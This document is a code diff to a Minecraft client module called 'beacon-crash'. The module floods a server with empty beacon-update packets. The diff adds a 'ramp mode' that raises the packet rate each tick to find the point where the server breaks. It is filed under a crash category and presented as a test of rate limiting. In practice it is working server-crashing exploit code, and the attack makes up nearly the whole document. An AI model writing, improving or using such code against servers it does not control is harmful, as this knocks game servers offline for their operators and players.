@@ -35,6 +35,16 @@ public class BeaconCrash extends Module {
         .name("amount").description("Packets per tick.")
         .defaultValue(500).min(1).sliderMax(5000).build()
     );
+    private final Setting<Boolean> rampMode = sgGeneral.add(new BoolSetting.Builder()
+        .name("ramp-mode")
+        .description("Auto-increment rate each tick to find the server's threshold. Starts at 1, steps up by ramp-step each tick.")
+        .defaultValue(false).build()
+    );
+    private final Setting<Integer> rampStep = sgGeneral.add(new IntSetting.Builder()
+        .name("ramp-step").description("Rate increase per tick in ramp mode.")
+        .defaultValue(10).range(1, 500).sliderRange(1, 100)
+        .visible(rampMode::get).build()
+    );
     private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
         .name("auto-disable").description("Disable when kicked from the server.")
         .defaultValue(true).build()
@@ -45,17 +55,23 @@ public class BeaconCrash extends Module {
     );
 
     private int ticksActive = 0, packetsSent = 0;
+    private int currentRate = 1;
 
     public BeaconCrash() {
         super(AddonTemplate.CRASH_CATEGORY, "beacon-crash",
             "Floods beacon-effect update packets with no beacon open. Tests beacon update gating + rate limiting.");
     }
 
+    @Override
+    public void onActivate() { ticksActive = 0; packetsSent = 0; currentRate = 1; }
+
     @EventHandler
     private void onTick(TickEvent.Post event) {
         if (mc.player == null) return;
         ticksActive++;
-        for (int i = 0; i < amount.get(); i++) {
+        int rate = rampMode.get() ? currentRate : amount.get();
+        if (rampMode.get()) currentRate += rampStep.get();
+        for (int i = 0; i < rate; i++) {
             mc.player.networkHandler.sendPacket(new UpdateBeaconC2SPacket(Optional.empty(), Optional.empty()));
             packetsSent++;
         }
@@ -63,7 +79,10 @@ public class BeaconCrash extends Module {
 
     @Override
     public void onDeactivate() {
-        if (showStats.get()) info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
+        if (showStats.get()) {
+            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
+            if (rampMode.get()) info("  Ramp: peak rate sent was %d/tick", currentRate - rampStep.get());
+        }
     }
 
     @EventHandler
